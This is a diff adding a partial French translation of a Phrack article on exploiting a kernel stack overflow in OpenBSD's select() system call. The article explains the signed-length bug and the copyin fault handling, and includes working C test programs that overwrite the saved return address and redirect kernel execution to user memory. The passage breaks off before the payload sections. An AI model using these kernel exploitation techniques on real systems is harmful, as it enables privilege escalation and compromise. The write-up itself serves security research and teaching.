@@ -1,0 +1,2084 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3c, Phile #0x06 of 0x10
+
+|=----------=[ Smashing The Kernel Stack For Fun And Profit ]=----------=|
+|=----------------------------------------------------------------------=|
+|=--------------=[ Sinan "noir" Eren <noir@olympos.org> ]=--------------=|
+
+DISCLAIMER :
+Cet article n'est pas le fait d'une organisation ou compagnie. C'est
+la contribution de l'auteur a la communaute des hackers en
+general. Les recherches et developpements dans cet article sont faits
+par l'auteur sans aucun support d'une organisation ou d'une compagnie
+commerciales. Aucune organisation ou compagnie ne peut etre tenue
+responsable ou meme creditee pour cet article, autre que l'auteur lui-meme.
+
+--[ Table des matieres
+
+	1 - Introduction
+
+	2 - La vulnerabilite : l'overflow dans l'appel systeme
+	select() de OpenBSD
+
+	3 - Obstacles rencontres dans l'exploitation
+	  3.1 - Vaincre le probleme de gros copyin()
+	      3.1.1 - mprotect() pour la vie !
+	  3.2 - Probleme de stockage du payload
+	  3.3 - Retour au probleme du user land
+
+	4 - Rusons l'exploit
+	  4.1 - Calcul des points d'arret et de la distance
+	  4.2 - Retour de l'adresse reecrite et redirection de
+	  l'execution
+
+	5 - Comment rassembler les offsets et les adresses de symboles
+	  5.1 - Appel systeme sysctl()
+	  5.2 - Technique sidt et recherche dans _kernel_text
+	  5.3 - Technique _db_lookup()
+	  5.4 - /usr/bin/nm, kvm_open(), nlist()
+	  5.5 - arrangement du %ebp
+
+	  6 - Creation du payload/shellcode
+	    6.1 - Ce qui doit etre accompli
+	    6.2 - Le payload
+	      6.2.1 - p_cred & u_cred
+	      6.2.2 - Casser le chroot
+	      6.2.3 - Niveau de securite
+	    6.3 - Devenir root et s'evader de la prison
+
+	  7 - Conclusion
+
+	  8 - Remerciements
+
+	  9 - References
+
+	  10 - Code
+
+
+--[ 1 - Introduction
+
+
+Cet article traite des expositions recentes de plusieurs
+vulnerabilites au niveau du noyau et des avancees dans leurs
+exploitations qui mene a des exploits fiables (oops surs) et robustes.
+
+Nous allons nous concentrer sur deux vulnerabilites recentes dans le
+noyau de OpenBSD comme etudes de cas. En dehors de celles-ci nous nous
+concentrerons principalement sur l'exploitation du depassement de
+tampon de l'appel systeme select(). La vulnerabilite de reecriture
+arbitraire dans la memoire de setitimer() sera expliquee dans la
+section code de cet article (comme lignes de  commentaires, pour ne
+pas repeter ce que nous avons deja couvert en explorant le buffer
+overflow de select() ).
+
+Ce papier ne devrait pas etre vu comme un tutoriel de construction
+d'exploit, mon but est, plutot, d'explorer et de demontrer des moyens
+classiques d'exploiter des depassements de pile et vulnerabilites de
+signes dans l'espace noyau.
+
+Les etudes de cas seront utilisees pour demontrer ces techniques, et
+des "shellcodes niveau noyau" *BSD reutilisables -- avec peins de trucs
+cools! -- seront presentes.
+
+Il y a des travaux proches effectues par [ESA] et [LSD-PL], qui
+peuvent completer cet article.
+
+--[ 2 - La Vulnerabilite : l'overflow de l'appel systeme select()
+
+sys_select(p, v, retval)
+        register struct proc *p;
+        void *v;
+        register_t *retval;
+{
+        register struct sys_select_args /* {
+                syscallarg(int) nd;
+                syscallarg(fd_set *) in;
+                syscallarg(fd_set *) ou;
+                syscallarg(fd_set *) ex;
+                syscallarg(struct timeval *) tv;
+        } */ *uap = v;
+        fd_set bits[6], *pibits[3], *pobits[3];
+        struct timeval atv;
+        int s, ncoll, error = 0, timo;
+        u_int ni;
+
+[1]     if (SCARG(uap, nd) > p->p_fd->fd_nfiles) {
+                /* forgiving; slightly wrong */
+                SCARG(uap, nd) = p->p_fd->fd_nfiles;
+        }
+[2]     ni = howmany(SCARG(uap, nd), NFDBITS) * sizeof(fd_mask);
+[3]     if (SCARG(uap, nd) > FD_SETSIZE) {
+
+        ...
+
+        }
+        ...
+#define getbits(name, x) \
+[4]   if (SCARG(uap, name) && (error = copyin((caddr_t)SCARG(uap, name), \
+            (caddr_t)pibits[x], ni))) \
+                goto done;
+[5]     getbits(in, 0);
+        getbits(ou, 1);
+        getbits(ex, 2);
+#undef  getbits
+
+        ...
+
+
+Pour comprendre ce code, nous devons aussi regarder la macro SCARG
+qui est beaucoup utilisé dans les routines de gestion de kernel syscall
+sur OpenBSD.
+
+
+En gros, SCARG() est une macro qui extrait les éléments des structures 
+'struct
+sys_XXX_args.
+
+sys/systm.h:114
+...
+#if     BYTE_ORDER == BIG_ENDIAN
+#define SCARG(p, k)     ((p)->k.be.datum)       /* get arg from args
+pointer */
+#elif   BYTE_ORDER == LITTLE_ENDIAN
+#define SCARG(p, k)     ((p)->k.le.datum)       /* get arg from args
+pointer */
+
+sys/syscallarg.h:14
+...
+#define syscallarg(x)                                                   \
+        union {                                                         \
+                register_t pad;                                         \
+                struct { x datum; } le;                                 \
+                struct {                                                \
+                        int8_t pad[ (sizeof (register_t) < sizeof (x))  \
+                                ? 0                                     \
+                                : sizeof (register_t) - sizeof (x)];    \
+                        x datum;                                        \
+                } be;                                                   \
+        }
+
+
+L'accès aux éléments de la stricture est effectuée par SCARG()
+afin de préserver l'alignement entre les registres CPU pour que les accès
+mémoires soient plus performant et plus rapides.
+
+Pour utiliser la macro SCARG(), les déclarations doivent être faites comme
+suit (exemple pour les arguments du syscall selec()):
+:
+
+
+sys/syscallarg.h:404
+...
+struct sys_select_args {
+[6]     syscallarg(int) nd;
+        syscallarg(fd_set *) in;
+        syscallarg(fd_set *) ou;
+        syscallarg(fd_set *) ex;
+        syscallarg(struct timeval *) tv;
+};
+
+La vulnérabilité peut etre décrite comme un contrôle insuffisant de 
+l'argument
+'nd' [6], qui est utilisé comme le paramètre de longueur pour les opérations
+de copie entre userland et kerneland.
+
+Pendant qu'il y a un controle [1] sur l'argument 'nd' (nd représente le plus
+grand numéro de descripteur plus 1 parmi les fd_sets), qui est comparé
+avec le p->p_fd->fd_nfiles (le nombre de descripteurs ouverts que le process
+gère), ce controle est mal fait -- 'nd' est déclaré comme signé [6], il peut
+donc etre négatif et passer le controle plus-grand-que [1].
+
+
+Ensuite, 'nd' est utilisé par une macro [2] pour calculer un nombre non 
+signé,
+'ni' qui peut éventuellemnt être utilisé comme l'argument de longeur pour
+l'opération de copie.
+
+howmany() [2] est défini de la sorte (sys/param.h line 175):
+
+#define howmany(x, y)   (((x)+((y)-1))/(y))
+
+Le développement de la ligne [2] apparait donc comme suit:
+
+sys/types.h:157, 169
+#define NBBY    8               /* number of bits in a byte */
+
+typedef int32_t fd_mask;
+#define NFDBITS (sizeof(fd_mask) * NBBY)        /* bits per mask */
+...
+ni = ((nd + (NFDBITS-1)) / NFDBITS)  * sizeof(fd_mask);
+ni = ((nd + (32 - 1)) / 32) * 4
+
+Le calcul de 'ni' est suivi par un autre controle de l'argument 'nd' [3].
+Ce controle est aussi contourné car les développeurs OpenBSD ont 
+complètement
+oublié les controles de signe sur l'arguement 'nd'. Le controle [3] a été 
+fait
+pour voir si l'espace alloué sur la pile est suffisant pour les opérations 
+de
+copie qui suivent et si ce n'est pas le cas, un espace suffisant en heap 
+sera
+alloué.
+
+Avec le test mal fait du signe, nous contournerons le check [3]
+(> FD_SETSIZE) et continuerons d'utiliser l'espace de la pile.
+Cela va nous rendre la vie plus facile étant donné que les stacks overflows
+sont exploités de facon plus triviale que les heap overflow. (Heureusement,
+je vais écrire un article supplémentaire qui montre l'exploitation
+de kernel-land heap overflows).
+
+Enfin la macro getbits() [4, 5] est défini et appelé pour extraire
+les fd_sets envoyés de l'utilisateur (readfds, writefds, exceptfds
+-- ces tableaux contiennent les descripteurs à tester pour être
+"prêt pour la lecture", "prêt pour l'écriture" ou "avoir une condition
+d'exception en suspens").
+
+Pour des raisons liées à l'exploitation, nous ne nous préoccupons pas
+de la forme des fd_sets -- ils peuvent être considéré comme n'importe quel
+simple tableau de caractèress à overflower pour écraser le saved ebp et le
+saved eip.
+
+Avec ce code simple, nous pouvons reproduire l'overflow:
+
+
+#include <stdio.h>
+#include <sys/types.h>
+
+int
+main(void)
+{
+        char *buf;
+        buf = (char *) malloc(1024);
+        memset(buf, 0x41, 1024);
+        select(0x80000000, (fd_set *) buf, NULL, NULL, NULL);
+}
+
+Voici ce qui se passe: le system call numéro 93 (SYS_select) est envoyé
+au handler sys_select() par la fonction syscall(), passé avec tous les
+user-land arguments groupés dans une structure sys_select_args.
+
+'nd' devenant 0x80000000 (le plus petit nombre négatif 32 bits signé),
+passe à traver le controle de la taille [1] et plus loin, la macro howmany()
+[2] calcule l'unsigned integer 'ni' comme 0x10000000. La macro getbits() [5]
+est alors appelée avec l'adresse de buf (user land, heap) qui s'étend à
+l'opération copyin(buf, kernel_stack, 0x10000000).
+
+copyin() commence par copier le buffer userland dans la pile du kernel,
+a long at a time (0x10000000/4 times). Toutefois cette opération de copie
+ne réussira pas complètement car le kernel va fuir de la pile du processus
+en essayant de copier un aussi gros buffer de userland -- et crashera dans
+une opération d'écriture hors des limites.
+
+
+--[3 -  Obstacles rencontres pour l'exploitation
+
+
+     - le problème copyin(uaddr, kaddr, big_number)
+
+Tout d'abord le problème principal est de prendre le controle sur l'argument
+taille 'ni' passé à l'opération copyin car ce nombre est dérivé de
+l'argument 'nd' qui etre doit etre négatif, nous ne serons jamais capable
+de construire un nombre raisonnablement grand. Pour l'instant le plus petit
+nombre positif que nous pouvons construire est 0x10000000. Comme nous 
+l'avons
+déjà remarqué ce nombre nous amène à atteindre la fin de la pile du kernel 
+et
+le kernel va ainsi paniquer. C'est notre premier obstacle et nous le
+surmonterons en explorant le fonctionnement de copyin() dans la prochaine
+section.
+
+      - probleme de stockage du payload
+
+C'est un problème typique pour n'importe quel type d'exploit (user ou kernel
+land).
+Déterminer ou est le meilleur endroit pour stocker le payload/shellcode. Ce
+problème est assez simple à résoudre dans les exploits kernel land et nous
+parlerons de la solution appropriée.
+
+      - probleme du retour propre au user land
+
+Un autre problème surgit après avoir écrasé l' adresse de retour sauvee et 
+pris
+le controle, à ce moment nous pouvons être assez imaginatif pour le payload 
+mais
+nous arrivons à des problèmes sur comment retourner en user land et profiter 
+de
+notre nouveau kernel space modifié!
+
+
+--[ 3.1 - Résoudre le problème du grand copyin()
+
+
+Pour etre en mesure de résoudre ce problème, nous avons besion de lire
+et de comprendre le code des fonctions copyin() et trap().
+
+Nous allons commencer regardant la primitive copyin() de copie de user à 
+kernel,
+mes commentaires seront ajoutes aux lignes :
+
+
+sys/arch/i386/i386/locore.s:955
+
+ENTRY(copyin)
+        pushl   %esi
+        pushl   %edi
+
+Save %esi, %edi .
+
+        movl    _C_LABEL(curpcb),%eax
+
+Change l'adresse du bloc de controle du processus actuel (_curpcb) dans %eax 
+.
+_C_LABEL() est une petite macro qui va ajouter un signe underscore au début
+du nom du symbole. Voir sys/arch/i386/include/asm.h:66
+
+Le bloc de controle de process [NDT : BCP] est une structure kernel propre 
+au
+processus  qui gère l'état courant d'exécution d'un process et qui
+diffère selon l'architecture de la machine. Il consiste en: stack pointer,
+programme counter, registres généraux, registres de management de la mémoire 
+et
+quelques éléments qui dépendent de l'architecture comme les LDT's des 
+process
+(i386). Les kernels *BSD étendent le  BCP avec des entrées liees au soft 
+comme
+le handler "copyin/out fault recovery" (pcb_onfault). Chaque bloc de 
+controle de
+process est stocké et référencé par la structure user.
+Voir sys/user.h:61 et [4.4 BSD].
+
+[1]    pushl   $0
+
+Push un ZERO sur la pile; cela sera utile à l'épilogue de la fonction
+_copy_fault function, qui contient l'instruction 'popl' correspondante.
+
+
+[2]    movl    $_C_LABEL(copy_fault),PCB_ONFAULT(%eax)
+
+Move l'adresse de l'entrée _copy_faults dans le membre du bloc du controle 
+de
+process pcb_onfault. Cela installe simplement un gestionnaire spécial de 
+fault
+pour les faults 'protection', 'segment not present' et 'alignment'.  
+copyin()
+installe son propre handler de fault, _copy_fault, nous retournerons à lui
+quand nous regarderons le code de trap(), car les faults du processeur sont 
+gérées
+à cet endroit.
+
+        movl    16(%esp),%esi
+        movl    20(%esp),%edi
+        movl    24(%esp),%eax
+
+Move le premier, deuxième et troisième arguement dans %esi, %edi, %eax
+respectivement. %esi étant le buffer user land, %edi le buffer destination 
+du kernel
+et %eax la taille.
+
+    /*
+     * Nous testons que la fin du buffer destination n'est pas plus loin que 
+la fin
+     * de l'espace d'addresse user.  Si ce n'est pas le cas, nous n'avons 
+plus qu'à
+     * vérifier que chaque page est readable, et le CPU fera cela pour nous.
+     */
+        movl    %esi,%edx
+        addl    %eax,%edx
+
+Cette addition sert à vérifier si l'adresse user land + la taille
+(%eax) est dans une adresse légale de l'espace user land. L'adresse user 
+land est
+déplacé dans %edx puis ajouté à la taille (ubuf + size), qui va pointer à la 
+fin
+supposee du buffer user land.
+
+        jc      _C_LABEL(copy_fault)
+
+C'est un test pour savoir si l'addition précédente a eu un problème 
+d'over-wrap:
+c'est-à-dire: soit l'adresse user land 0x0ded et la taille 0xffffffff -- 
+cette
+opération non-signée va overlappper et le résultat sera 0x0dec. Par design 
+le
+CPU va mettre le carry flag sur cette condition et 'jc' jump avec ce flag ce 
+qui
+va nous amener à la fonction _copy_fault qui fait certains nettoyages et 
+retourne
+EFAULT .
+
+
+        cmpl    $VM_MAXUSER_ADDRESS,%edx
+        ja      _C_LABEL(copy_fault)
+
+
+Suit un controle d'intervalle si l'adresse user land + la taille est 
+toujours
+dans l'espace user land. Une comparaison est faite avec la constante
+VM_MAXUSER_ADDRESS qui est la fin de la pile user land (0xdfbfe000 sous obsd 
+2.6-3.1).
+Si la somme (%edx) est au dessus de VM_MAXUSER_ADDRESS l'instruction 'ja'
+(jump above) va faire un jump vers _copy_fault , éventuellement jusqu'à 
+terminer
+l'opération de copie.
+
+3:	/* bcopy(%esi, %edi, %eax); */
+	cld
+
+Libere le flag de direction, DF=0, signifiant que l'opreation de copie
+est en train d'incrementer les registres d'index '%esi et %edi'.
+
+        movl    %eax,%ecx
+        shrl    $2,%ecx
+        rep
+        movsl
+
+Fait la copie [long at a time], de %esi jusqu'a %edi.
+
+        movb    %al,%cl
+        andb    $3,%cl
+        rep
+        movsb
+
+Copie les donnees restantes (taille % 4), un octet a la fois.
+
+        movl    _C_LABEL(curpcb),%edx
+        popl    PCB_ONFAULT(%edx)
+
+Bouge l'adresse du bloc de controle de processus courante dans %edx,
+et ensuite pop la premiere valeur sur la pile dans le membre
+pcb_onfault (ZERO [1] a deja ete push avant). Ceci signifie que le
+handler special d'erreur est nettoye du processus.
+
+        popl    %edi
+        popl    %esi
+
+Restaure les anciennes valeurs de %edi, %esi.
+
+        xorl    %eax,%eax
+        ret
+
+Fait un retour avec les valeurs de retour de zero : Succes.
+
+ENTRY(copy_fault)
+
+Encas d'erreurs et d'echecs dans la verification dans copyin c'est
+ici que nous envoyons.
+
+        movl    _C_LABEL(curpcb),%edx
+        popl    PCB_ONFAULT(%edx)
+
+Bouge l'adresse du bloc de controle de processus courante dans %edx,
+et ensuite pop la premiere valeur sur la pile dans le membre
+pcb_onfault (ZERO [1] a deja ete push avant). Ceci signifie que le
+handler special d'erreur est nettoye du processus.
+
+        popl    %edi
+        popl    %esi
+
+Restaure les anciennes valeurs de %edi, %esi.
+
+        movl    $EFAULT,%eax
+        ret
+
+Fait un retour avec une valeur de retour de EFAULT (14) : Echec.
+
+Apres cette longue exploration de la fonction copyin() nous allons
+jetter un bref coup d'oeuil a trap() et voir comment pcb_onfault est
+implementee. trap() est l'interface principale pour l'interception des
+exceptions, erreurs et pieges dans le noyau BSD.
+
+trap.h:51:#define    T_PROTFLT        4      /* protection fault */
+trap.h:63:#define    T_SEGNPFLT      16      /* segment not present fault
+*/
+trap.h:54:#define    T_ALIGNFLT       7      /* alignment fault */
+
+sys/arch/i386/i386/trap.c:174
+void
+trap(frame)
+        struct trapframe frame;
+{
+        register struct proc *p = curproc;
+        int type = frame.tf_trapno;
+...
+        switch (type) {
+
+...
+line: 269
+
+        case T_PROTFLT:
+        case T_SEGNPFLT:
+        case T_ALIGNFLT:
+                /* Check for copyin/copyout fault. */
+[1]             if (p && p->p_addr) {
+[2]                     pcb = &p->p_addr->u_pcb;
+[3]                     if (pcb->pcb_onfault != 0) {
+                        copyfault:
+[4]                             frame.tf_eip = (int)pcb->pcb_onfault;
+                                return;
+                        }
+                }
+
+...
+
+Les erreurs comme 'protection', 'segment non present' et 'alignement'
+sont toutes interceptees ensembles, a travers une declaration switch dans
+le code de trap(). Le cas approprie pour les erreurs mentionnees dans
+trap(), verifie au debut l'existance des structures process et user
+[1] ensuite charge le bloc de controle de processus de la structure
+user [2], verifie si le pcb_onfault est mis [3] si c'est mis, le
+pointeur d'instruction (%eip) du bloc de controle de processus est
+reecrit avec la valeur de ce hanler d'erreur special [4]. Apres que le
+processus soit switche selon le contexte, et donne au CPU, il va se
+lancer depuis le nouveau code de handler dans l'espace noyau. Dans le
+cas de copyin(), l'execution sera redirigee vers _copy_fault.
+
+Armes de toute cette connaissance, nous pouvons a present fournir une
+solution au probleme de 'gros copyin()'.
+
+
+--[ 3.1.1 - mprotect pour la vie !
+
+Les operations memoires des CPU x86 comme tenter de lire depuis des
+pages write only (-w-) ou tenter d'ecrire dans une page read only (r--) ou
+no access (---) et autres combinaisons vons emettre une erreur de
+protection qui sera interceptee par le code de trap() comme vu ci-dessus.
+
+Cette fonctionnalite de base va nous permettre d'ecrire autant
+d'octets que nous le voulons dans l'epace noyau, aussi grosse soit
+l'actuelle valeur de taille. Comme vu precedemment, le code de trap()
+verifie le handler pcb_onfault pour les erreurs de protection et
+redirige l'execution dessus. Pour stopper la copie depuis le user land
+vers le kernel land, nous aurons besoin de fermer le bit de protection
+de lecture de certaines pages qui suivent le vecteur d'overflow et
+atteindre notre but.
+
+-------------
+|    rwx    | --> Memoire user land PAGE_SIZEd allouee dynamiquement
+|           |
+|           |
+|xxxxxxxxxxx| --> Vecteur d'overflow (tableau fd_set)
+-------------     (valeur de %ebp, %eip reecrites et sauvees)
+|    -w-    |
+|           |
+|           | --> Memoire consecutive PAGE_SIZEd
+|           |     allouee dynamiquement, PROT_WRITE
+-------------
+
+Le moyen de controler l'overflow comme decrit dans le diagramme est
+d'allouer 2 gros morceaux de memoire PAGE_SIZEd et remplir la fin de
+la premiere page avec les donnees de l'overfow (vecteur
+d'exploitation) et ensuite fermer le bit de  protection de lecture de
+la page suivante.
+
+A ce point nous avons un autre probleme (quoiqu'assez simple a
+surmonter). PAGE_SIZE est 4096 en x86 et 4096 octets de pile debordee
+aura crashe le noyau auparavant (avant que nous prenions le controle).
+
+Actuellement pour cet overflow specifique les %ebp et %eip sauves sont
+192 et 196 octets plus loin que le tampon deborde,
+respectivement. Donc, ce que nous allons faire c'est allouer 2 pages
+et passer le pointeur fd_set comme 'second-page - 200'.
+Ensuite copyin() commencera a copier juste 200 octets avant la fin de
+la page lisible et va toucher la page non-lisible juste apres. Une
+exception sera levee et trap() va interpreter l'erreur comme explique,
+le handler 'protection fault' va checker le pcb_onfault et mettre le
+pointeur d'intruction du PCB courant a l'addresse du handler, dans ce
+cas _copy_fault.
+_copy_fault retournera EFAULT.
+
+Si nous retournons au code de sys_select() la macro getbits()
+verifiera la valeur de retour et ira a l'etiquette 'done' pour toute
+autre valeur que success (0). A ce moment sys_select() met le code
+d'erreur (errno) et retourne a syscall() (expediteur d'appel systeme).
+
+Voici le code de test pour verifier la technique mprotect :
+
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+int
+main(void)
+{
+        char *buf;
+	u_long pgsz = sysconf(_SC_PAGESIZE);
+
+        buf = (char *) malloc(pgsz * 3);
+	/* asking for 3 pages, just to be safe */
+	if(!buf) { perror("malloc"); exit(-1); }
+        memset(buf, 0x41, pgsz*3); /* 0x41414141 ;) */
+
+	buf = (char *) (((u_long) buf & ~pgsz) + pgsz);
+	/* la nous utilisons les pages 2 et 3 */
+
+	if(mprotect((char *) ((u_long) buf + pgsz), (size_t) pgsz,
+		PROT_WRITE) < 0)
+	{
+		perror("mprotect"); exit(-1);
+	}
+	/* nous mettons la 3eme page en WRITE only
+	 * quoi que ce soit autre que READ est bon
+	 */
+
+	select(0x80000000, (fd_set *) ((u_long) buf + pgsz - 200), NULL,
+		NULL, NULL);
+}
+
+- Le debugger noyau ddb>
+
+Pour pouvoir debugger le noyau nous aurons besoin d'installer le
+kernel debugger ddb. Taper les commandes suivantes pour etre sur que
+ddb est present et n'oubliez pas ca, vous devriez avoir plusieures
+sortes d'acces console pour pouvoir debugger le noyau. (Acces
+physique, cable console ou ces funky appareils reseau...)
+
+bash-2.05a# sysctl -w ddb.panic=1
+ddb.panic: 1 -> 1
+bash-2.05a# sysctl -w ddb.console=1
+ddb.console: 1 -> 1
+
+La premiere commande sysctl configure ddb pour desassembler les kernel
+panics. La derniere rends ddb accessible depuis la console a n'importe
+quel moment donne, avec la combinaison clavier ESC+CTRL+ALT.
+
+Il n'y a pas moyen d'explorer les failles noyau sans rencontrer des
+panics, donc mettons les mains dans le cambouis.
+
+bash-2.05a# gcc -o test2 test2.c
+bash-2.05a# sync
+bash-2.05a# sync
+bash-2.05a# uname -a
+OpenBSD kernfu 3.1 GENERIC#59 i386
+bash-2.05a# ./test2
+uvm_fault(0xe4536c6c, 0x41414000, 0, 1) -> e
+kernel: page fault trap, code=0
+Stopped at	0x41414141:uvm_fault(0xe4536c6c, 0x41414000, 0, 1) -> e
+...
+
+ddb> trace
+...
+_kdb_trap(6,0,e462af08,1) at _kdb_trap+0xc1
+_trap() at _trap+0x1b0
+--- trap (number 6) ---
+0x41414141:
+ddb>
+
+Ce que signifie tout ceci est qu'un piege d'erreur de page a ete pris
+a l'adresse 0x41414141 et comme c'est une adresse invalide pour
+l'espace noyau, ca pas pu se faire (comme pour toute reference a une
+adresee invalide) ce qui mene a panic(). Ceci veut dire que nous
+sommes sur la bonne voie et en effet reecrire le %eip pour que la page
+0x41414000 soit tentee d'etre chargee en memoire.
+
+Type following for a clean reboot.
+ddb> boot sync
+....
+
+Verifions que nous gagnons le controle en reecrivant le %eip - voici
+comment mettre les points d'arret appropries :
+
+Hit CTRL+ALT+ESC:
+
+ddb> x/i _sys_select,130
+_sys_select:	pushl	%ebp
+_sys_select+0x1:	movl	%esp,%ebp
+...
+...
+_sys_select+0x424:	leave
+_sys_select+0x425:	ret
+_sys_select+0x426:	nop
+...
+ddb> break _sys_select+0x425
+ddb> cont
+^M	--> hit enter!
+bash-2.05a#
+
+A ce point quelques autres processus peuvent demolir ddb> a cause de
+son utilisation de l'appel systeme select, tapez juste 'cont' au
+prompt ddb> et frappez CR.
+
+bash-2.05a# ./test2
+...
+ddb> print $ebp
+41414141
+ddb> x/i $eip
+_sys_select+0x425:	ret
+ddb> x/x $esp
+0xe461df3c:	41414141 --> saved instruction pointer!
+ddb> boot sync
+...
+
+
+--[ 3.2 - Probleme de stockage du payload
+
+La zone de stockage du payload pour les failles user land est
+d'habitude le tampon deborde lui-meme (s'il est assez long) ou quelque
+autre endroit utilisateur connu comme les variables environnement, les
+restes de la commande pre-overflow, etc., etc, en bref, toute memoire
+controlee par l'utilisateur qui va rester residente suffisamment
+longtemps pour reference a un autre moment. Comme le tampon deborde
+peut etre petit en taille [NDT : autant que la teub de Jacob ?], ce
+n'est pas toujours faisable de stocker la le payload. Actuellement,
+pour cet overflow specifique, le contenu du tampon deborde est
+corrompu, ne nous laissant aucune chance de retourner dedans. Donc,
+nous aurons besoin d'assez de place pour executer le code dans
+l'espace noyau pour pouvoir faire des taches complexes, comme resetter
+le pointeur chroot [NDT : ARGH, c'est possible ca ?], alterer pcred,
+ucred et securelevel et calculer ou on va retourner ... pour toutes ces
+raisons, nous allons executer le payload dans le tampon source
+-oppose au tampon destination (celui qui va se prendre l'overflow).
+Ceci signifie que nous allons jumper a la page user land,
+executer notre payload et retourner dans notre appelant de facon
+transparente. Tout ca est une execution legitime et nous aurons
+presque l'espace illimite pour executer notre payload. En regard de
+l'overflow de select() : copyin(ubuf, kbuf, big_num), nous executerons
+le code dans 'ubuf'.
+
+
+--[ 3.3 - Retour au probleme user land
+
+Apres que nous ayons gagne le controle et execute notre payload, nous
+aurons besoin de nettoyer des choses et commencer notre voyage dans le
+user land mais ce n'est pas aussi simple que cela pourrait parraitre.
+Ma premiere approche etait de faire un 'iret' (retour d'interruption)
+dans le payload apres avoir altere toutes les structures noyau
+necessaires mais cette approche s'avere etre reellement penible. Tout
+d'abord, ce n'est pas une tache facile que de faire tous les
+interceptions post-syscall faites par la fonction syscall(). Aussi, le
+code de trap() pour la transition de kernel vers user land ne peut pas
+etre facilement tourne dans le code d'assemblement du payload. Quoi
+qu'il en soit, la raison la plus evidente de ne pas choisir la
+technique 'iret' est que mettre en desordre d'importantes primitives
+noyau comme les locks, signaux en attente et/ou interrupteurs capables
+de masquer est un truc reellement risque qui reduirait drastiquement
+la fiabilite des exploits et augmenterait le potentiel pour l'expoitation
+future d'une kernel panic. J'ai donc choisi de rester a l'ecart de
+ca ! ;)
+
+La solution etait evidente, apres l'execution du payload nous devrions
+retourner au point dans le handler syscall() ou _sys_select etait
+suppose retourner. Apres ce point, nous n'avons plus besoin de faire
+attention aux primitives noyau deja mentionnees. Cette solution mene a
+la question de comment decouvrir ou retourner dedans car nous avons
+reecrit l'adresse de retour pour gagner le controle et donc perdu
+notre localisation de l'appellant. Nous allons explorer plusieurs des
+solutions possible dans la section 5 et l'usage du registre idtr pour
+la reunion de l'espace noyau sera introduit a la section 5.2 pour un
+peu d'amusement serieux !!  Allons-y ...
+
+
+--[ 4 - Rusons l'exploit
+
+
+Dans cette section, seront discuttes l'installation de points d'arrets
+particuliers et comment calculer la distance jusqu'au pointeur
+d'instruction. Une nouvelle version du code de test sera donc
+presentee dans le but de demontrer que l'execution peut etre effectuee
+avec succes directement dans le tampon de l'espace utilisateur.
+
+
+--[ 4.1 - Points d'arrets et calcul de distance
+
+bash-2.05a# nm /bsd | grep _sys_select
+e045f58c T _linux_sys_select
+e01c5a3c T _sys_select
+bash-2.05a# objdump -d --start-address=0xe01c5a3c --stop-
+address=0xe01c5e63\
+>  /bsd | grep _copyin
+e01c5b72:       e8 f9 a9 f3 ff          call   e0100570 <_copyin>
+e01c5b9f:       e8 cc a9 f3 ff          call   e0100570 <_copyin>
+e01c5bcc:       e8 9f a9 f3 ff          call   e0100570 <_copyin>
+e01c5bf9:       e8 72 a9 f3 ff          call   e0100570 <_copyin>
+
+Le premier copyin est celui qui copie le readfds et overflow la pile
+noyau. C'est celui que nous sommes apres.
+
+CTRL+ALT+ESC
+bash-2.05a# Stopped at _Debugger+0x4: leave
+ddb> x/i 0xe01c5b72
+_sys_select+0x136:	call	_copyin
+ddb> break _sys_select+0x136
+ddb> cont
+^M
+bash-2.05a# ./test2
+Breakpoint at	_sys_select+0x136:	call	_copyin
+ddb> x/x $esp,3
+0xe461de20:	5f38	e461de78	10000000
+
+Ceux-ci sont les trois arguments mis sur la pile pour copyin() ubuf: 0x5f38
+kbuf: 0xe461de78 len:10000000
+
+ddb> x/x 0x5f38
+0x5f38:	41414141
+...
+ddb> x/x $ebp
+0xe461df38:	e461dfa8	--> saved %ebp
+ddb> ^M
+0xe461df3c:	e02f34ce	--> saved %eip
+ddb>
+
+Dans les conventions d'appel x86, deux longueurs juste avant le
+pointeur de base sont le eip (adresse de retour) et le ebp sauves,
+respectivement. Pour calculer la distance entre le tampon de la pile
+et le eip sauve dans ddb on fait comme suit :
+
+ddb> print 0xe461df3c - 0xe461de78
+      c4
+ddb> boot sync
+...
+
+La distance entre l'adresse de "l'adresse de retour" sauvee et le
+tampon noyau est 196 (0xc4) octets. Limiter notre operation de
+copyin() a 200 octets avec la technique mprotect() assure un overlow
+propre.
+
+
+--[ 4.2 - Reecriture de l'adresse de retour et redirection de
+  l'exectution
+
+
+A ce stade je vais introduire un autre code de test pour "verifier" la
+redirection de l'execution et l'employabilite  de l'espace utilisateur
+pour l'execution du payload.
+
+test3.c:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+int
+main(void)
+{
+        char *buf;
+        long *lptr;
+        u_long pgsz = sysconf(_SC_PAGESIZE);
+
+        buf = (char *) malloc(pgsz * 3);
+        if(!buf) { perror("malloc"); exit(-1); }
+        memset(buf, 0xcc, pgsz*3); /* int3 */
+
+        buf = (char *) (((u_long) buf & ~pgsz) + pgsz);
+
+	if(mprotect((char *) ((u_long) buf + pgsz), (size_t) pgsz,
+		PROT_WRITE) < 0)
+        {
+		perror("mprotect"); exit(-1);
+	}
+
+
+        lptr = (long *) ((u_long)buf + pgsz - 8);
+        *lptr++ = 0xbaddcafe; /* le %ebp sauve, n'a pas
+			       * d'importance a ce stade
+			       */
+        *lptr++ = (long) buf; /* reecrit l'adresse de retour
+			       * avec l'adresse du tampon
+			       */
+	select(0x80000000, (fd_set *) ((u_long) buf + pgsz - 200), NULL,
+		NULL, NULL);
+}
+
+
+Le code de test3.c reecrira le ebp sauve avec 0xbaddcafe et le pointeur
+d'intruction sauve avec l'adresse du tampon de l'espace utilisateur,
+qui est comble avec des 'int 3' (interruptions de deboguage). Ce code
+devrait demolir le debugger de noyau.
+
+bash-2.05a# gcc -o test3 test3.c
+bash-2.05a# ./test3
+Stopped at	0x5001:	int	$3
+ddb> x/i $eip,2
+0x5001:	int	$3
+0x5002: int	$3
+ddb> print $ebp
+baddcafe
+ddb> boot sync
+...
+
+Tout ce passe comme prevu, nous sautons avec succes dans le user land
+et executons le code. A present nous devons nous contentrer sur les
+autres problemes comme la creation du payload/shellcode, la reunion de
+l'adresse du symbole au moment du lancement, etc.
+
+
+--[ 5 - Comment rassembler les offsets et les adresses de symboles
+
+
+Avant de considerer ce qu'il y a a achever avec le payload du noyau,
+je devrais vous rappeler qu'a la precedente question que nous avons
+soulevee, qui etait comment retourner en arriere au user land, la
